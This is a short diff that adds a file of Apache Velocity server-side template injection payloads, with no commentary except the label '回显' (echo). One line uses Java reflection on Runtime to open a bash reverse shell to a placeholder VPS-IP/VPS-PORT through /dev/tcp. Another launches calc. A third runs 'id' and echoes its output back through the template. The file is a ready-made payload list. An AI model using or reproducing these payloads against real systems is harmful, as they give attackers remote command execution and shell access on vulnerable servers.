@@ -1,0 +1,14 @@
+$bizBean.class.class.forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec("/bin/bash -c bash${IFS}-i${IFS}>&/dev/tcp/VPS-IP/VPS-PORT<&1")
+
+
+#set($e="e")
+${e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")}
+
+回显
+#set($x='') #set($rt=$x.class.forName('java.lang.Runtime'))
+#set($chr=$x.class.forName('java.lang.Character')) 
+#set($str=$x.class.forName('java.lang.String')) 
+#set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() 
+#set($out=$ex.getInputStream()) 
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))
+#end
